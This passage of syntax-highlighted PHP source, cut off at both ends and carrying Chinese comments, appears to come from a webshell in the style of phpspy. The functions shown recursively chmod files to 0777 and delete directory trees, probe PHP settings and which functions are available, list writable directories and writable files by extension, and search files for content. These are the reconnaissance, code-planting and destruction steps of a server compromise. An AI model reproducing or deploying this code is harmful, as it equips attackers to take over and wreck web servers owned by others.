text-decoration: underline;">'name'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #70c0b1;">''</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21024;&#38500;&#30446;&#24405;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">deltree</span>($<span style="color: #e7c547;">deldir</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mydir</span>=<span style="color: #b9ca4a;">@dir</span>($<span style="color: #e7c547;">deldir</span>);<span style="color: #d54e53; background-color: #424242;">   </span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span>($<span style="color: #e7c547;">file</span>=$<span style="color: #e7c547;">mydir</span>-&gt;<span style="color: #eaeaea; background-color: #000000;">read</span>())     {<span style="color: #d54e53; background-color: #424242;">       </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>((<span style="color: #eaeaea; background-color: #000000;">is_dir(</span>$<span style="color: #e7c547;">deldir</span>.<span style="color: #70c0b1;">'/'</span>.$<span style="color: #e7c547;">file</span>)) &amp;&amp; ($<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'.'</span>) &amp;&amp; ($<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'..'</span>)) {<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">chmod(</span>$<span style="color: #e7c547;">deldir</span>.<span style="color: #70c0b1;">'/'</span>.$<span style="color: #e7c547;">file</span>,<span style="color: #eaeaea; background-color: #000000;">0777</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">deltree(</span>$<span style="color: #e7c547;">deldir</span>.<span style="color: #70c0b1;">'/'</span>.$<span style="color: #e7c547;">file</span>);<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">is_file(</span>$<span style="color: #e7c547;">deldir</span>.<span style="color: #70c0b1;">'/'</span>.$<span style="color: #e7c547;">file</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">chmod(</span>$<span style="color: #e7c547;">deldir</span>.<span style="color: #70c0b1;">'/'</span>.$<span style="color: #e7c547;">file</span>,<span style="color: #eaeaea; background-color: #000000;">0777</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">unlink(</span>$<span style="color: #e7c547;">deldir</span>.<span style="color: #70c0b1;">'/'</span>.$<span style="color: #e7c547;">file</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mydir</span>-&gt;<span style="color: #eaeaea; background-color: #000000;">close</span>();<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">chmod(</span>$<span style="color: #e7c547;">deldir</span>,<span style="color: #eaeaea; background-color: #000000;">0777</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> @<span style="color: #eaeaea; background-color: #000000;">rmdir(</span>$<span style="color: #e7c547;">deldir</span>) ? <span style="color: #eaeaea; background-color: #000000;">1</span> : <span style="color: #eaeaea; background-color: #000000;">0</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#34920;&#26684;&#34892;&#38388;&#30340;&#32972;&#26223;&#33394;&#26367;&#25442;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">bg</span>() {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">bgc</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> ($<span style="color: #e7c547;">bgc</span>++%<span style="color: #eaeaea; background-color: #000000;">2</span>==<span style="color: #eaeaea; background-color: #000000;">0</span>) ? <span style="color: #70c0b1;">'alt1'</span> : <span style="color: #70c0b1;">'alt2'</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30340;&#25991;&#20214;&#31995;&#32479;&#36335;&#24452;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">getPath</span>($<span style="color: #e7c547;">scriptpath</span>, $<span style="color: #e7c547;">nowpath</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">nowpath</span> == <span style="color: #70c0b1;">'.'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">nowpath</span> = $<span style="color: #e7c547;">scriptpath</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">nowpath</span> = <span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #70c0b1;">'\\'</span>, <span style="color: #70c0b1;">'/'</span>, $<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">nowpath</span> = <span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #70c0b1;">'//'</span>, <span style="color: #70c0b1;">'/'</span>, $<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">substr(</span>$<span style="color: #e7c547;">nowpath</span>, -<span style="color: #eaeaea; background-color: #000000;">1</span>) != <span style="color: #70c0b1;">'/'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">nowpath</span> = $<span style="color: #e7c547;">nowpath</span>.<span style="color: #70c0b1;">'/'</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">nowpath</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">getUpPath</span>($<span style="color: #e7c547;">nowpath</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">pathdb</span> = <span style="color: #eaeaea; background-color: #000000;">explode(</span><span style="color: #70c0b1;">'/'</span>, $<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">num</span> = <span style="color: #eaeaea; background-color: #000000;">count(</span>$<span style="color: #e7c547;">pathdb</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">num</span> &gt; <span style="color: #eaeaea; background-color: #000000;">2</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">unset(</span>$<span style="color: #e7c547;">pathdb</span>[$<span style="color: #e7c547;">num</span>-<span style="color: #eaeaea; background-color: #000000;">1</span>],$<span style="color: #e7c547;">pathdb</span>[$<span style="color: #e7c547;">num</span>-<span style="color: #eaeaea; background-color: #000000;">2</span>]);
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">uppath</span> = <span style="color: #eaeaea; background-color: #000000;">implode(</span><span style="color: #70c0b1;">'/'</span>, $<span style="color: #e7c547;">pathdb</span>).<span style="color: #70c0b1;">'/'</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">uppath</span> = <span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #70c0b1;">'//'</span>, <span style="color: #70c0b1;">'/'</span>, $<span style="color: #e7c547;">uppath</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">uppath</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#26816;&#26597;PHP&#37197;&#32622;&#21442;&#25968;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">getcfg</span>($<span style="color: #e7c547;">varname</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">result</span> = <span style="color: #eaeaea; background-color: #000000;">get_cfg_var(</span>$<span style="color: #e7c547;">varname</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">result</span> == <span style="color: #eaeaea; background-color: #000000;">0</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #70c0b1;">'No'</span>;
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">result</span> == <span style="color: #eaeaea; background-color: #000000;">1</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #70c0b1;">'Yes'</span>;
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">result</span>;
<span style="background-color: #424242;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#26816;&#26597;&#20989;&#25968;&#24773;&#20917;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">getfun</span>($<span style="color: #e7c547;">funName</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> (<span style="color: #7aa6da;">false</span> !== <span style="color: #eaeaea; background-color: #000000;">function_exists(</span>$<span style="color: #e7c547;">funName</span>)) ? <span style="color: #70c0b1;">'Yes'</span> : <span style="color: #70c0b1;">'No'</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#24471;&#25991;&#20214;&#25193;&#23637;&#21517;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">getext</span>($<span style="color: #e7c547;">file</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">info</span> = <span style="color: #eaeaea; background-color: #000000;">pathinfo(</span>$<span style="color: #e7c547;">file</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">info</span>[<span style="color: #70c0b1;">'extension'</span>];
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">GetWDirList</span>($<span style="color: #e7c547;">dir</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">dirdata</span>,$<span style="color: #e7c547;">j</span>,$<span style="color: #e7c547;">nowpath</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">j</span> &amp;&amp; $<span style="color: #e7c547;">j</span>=<span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">dh</span> = <span style="color: #eaeaea; background-color: #000000;">opendir(</span>$<span style="color: #e7c547;">dir</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span> ($<span style="color: #e7c547;">file</span> = <span style="color: #eaeaea; background-color: #000000;">readdir(</span>$<span style="color: #e7c547;">dh</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">f</span>=<span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #70c0b1;">'//'</span>,<span style="color: #70c0b1;">'/'</span>,$<span style="color: #e7c547;">dir</span>.<span style="color: #70c0b1;">'/'</span>.$<span style="color: #e7c547;">file</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'.'</span> &amp;&amp; $<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'..'</span> &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">is_dir(</span>$<span style="color: #e7c547;">f</span>)){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">is_writable(</span>$<span style="color: #e7c547;">f</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'filename'</span>]=<span style="color: #eaeaea; background-color: #000000;">str_replace(</span>$<span style="color: #e7c547;">nowpath</span>,<span style="color: #70c0b1;">''</span>,$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'mtime'</span>]=<span style="color: #b9ca4a;">@date</span>(<span style="color: #70c0b1;">'Y-m-d H:i:s'</span>,<span style="color: #eaeaea; background-color: #000000;">filemtime(</span>$<span style="color: #e7c547;">f</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'dirchmod'</span>]=<span style="color: #eaeaea; background-color: #000000;">getChmod(</span>$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'dirperm'</span>]=<span style="color: #eaeaea; background-color: #000000;">getPerms(</span>$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'dirlink'</span>]=$<span style="color: #e7c547;">dir</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'server_link'</span>]=$<span style="color: #e7c547;">f</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">j</span>++;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">GetWDirList(</span>$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">closedir(</span>$<span style="color: #e7c547;">dh</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">clearstatcache(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">dirdata</span>;
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   }
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">GetWFileList</span>($<span style="color: #e7c547;">dir</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">filedata</span>,$<span style="color: #e7c547;">j</span>,$<span style="color: #e7c547;">nowpath</span>, $<span style="color: #e7c547;">writabledb</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">j</span> &amp;&amp; $<span style="color: #e7c547;">j</span>=<span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">dh</span> = <span style="color: #eaeaea; background-color: #000000;">opendir(</span>$<span style="color: #e7c547;">dir</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span> ($<span style="color: #e7c547;">file</span> = <span style="color: #eaeaea; background-color: #000000;">readdir(</span>$<span style="color: #e7c547;">dh</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">ext</span> = <span style="color: #eaeaea; background-color: #000000;">getext(</span>$<span style="color: #e7c547;">file</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">f</span>=<span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #70c0b1;">'//'</span>,<span style="color: #70c0b1;">'/'</span>,$<span style="color: #e7c547;">dir</span>.<span style="color: #70c0b1;">'/'</span>.$<span style="color: #e7c547;">file</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'.'</span> &amp;&amp; $<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'..'</span> &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">is_dir(</span>$<span style="color: #e7c547;">f</span>)){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">GetWFileList(</span>$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span>($<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'.'</span> &amp;&amp; $<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'..'</span> &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">is_file(</span>$<span style="color: #e7c547;">f</span>) &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">in_array(</span>$<span style="color: #e7c547;">ext</span>, <span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">explode(</span><span style="color: #70c0b1; text-decoration: underline;">','</span><span style="text-decoration: underline;">, $</span><span style="color: #e7c547; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">is_writable(</span>$<span style="color: #e7c547;">f</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'filename'</span>]=<span style="color: #eaeaea; background-color: #000000;">str_replace(</span>$<span style="color: #e7c547;">nowpath</span>,<span style="color: #70c0b1;">''</span>,$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'size'</span>]=<span style="color: #eaeaea; background-color: #000000;">sizecount(</span>@<span style="color: #eaeaea; background-color: #000000;">filesize(</span>$<span style="color: #e7c547;">f</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'mtime'</span>]=<span style="color: #b9ca4a;">@date</span>(<span style="color: #70c0b1;">'Y-m-d H:i:s'</span>,<span style="color: #eaeaea; background-color: #000000;">filemtime(</span>$<span style="color: #e7c547;">f</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'filechmod'</span>]=<span style="color: #eaeaea; background-color: #000000;">getChmod(</span>$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'fileperm'</span>]=<span style="color: #eaeaea; background-color: #000000;">getPerms(</span>$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'fileowner'</span>]=<span style="color: #eaeaea; background-color: #000000;">getUser(</span>$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'dirlink'</span>]=$<span style="color: #e7c547;">dir</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'server_link'</span>]=$<span style="color: #e7c547;">f</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">j</span>++;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">closedir(</span>$<span style="color: #e7c547;">dh</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">clearstatcache(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">filedata</span>;
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   }
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">GetSFileList</span>($<span style="color: #e7c547;">dir</span>, $<span style="color: #e7c547;">content</span>, $<span style="color: #e7c547;">re</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">filedata</span>,$<span style="color: #e7c547;">j</span>,$<span style="color: #e7c547;">nowpath</span>, $<span style="color: #e7c547;">writabledb</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">j</span> &amp;&amp; $<span style="color: #e7c547;">j</span>=<span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">dh</span> = <span style="color: #eaeaea; background-color: #000000;">opendir(</span>$<span style="color: #e7c547;">dir</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span> ($<span style="color: #e7c547;">file</span> = <span style="color: #eaeaea; background-color: #000000;">readdir(</span>$<span style="color: #e7c547;">dh</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">ext</span> = <span style="color: #eaeaea; background-color: #000000;">getext(</span>$<span style="color: #e7c547;">file</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">f</span>=<span style="color: #eaeaea; background-color: #000000;">str_replace(</span><span style="color: #70c0b1;">'//'</span>,<span style="color: #70c0b1;">'/'</span>,$<span style="color: #e7c547;">dir</span>.<span style="color: #70c0b1;">'/'</span>.$<span style="color: #e7c547;">file</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'.'</span> &amp;&amp; $<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'..'</span> &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">is_dir(</span>$<span style="color: #e7c547;">f</span>)){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">GetSFileList(</span>$<span style="color: #e7c547;">f</span>, $<span style="color: #e7c547;">content</span>, $<span style="color: #e7c547;">re</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span>($<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'.'</span> &amp;&amp; $<span style="color: #e7c547;">file</span>!=<span style="color: #70c0b1;">'..'</span> &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">is_file(</span>$<span style="color: #e7c547;">f</span>) &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">in_array(</span>$<span style="color: #e7c547;">ext</span>, <span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">explode(</span><span style="color: #70c0b1; text-decoration: underline;">','</span><span style="text-decoration: underline;">, $</span><span style="color: #e7c547; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">find</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">re</span>) {
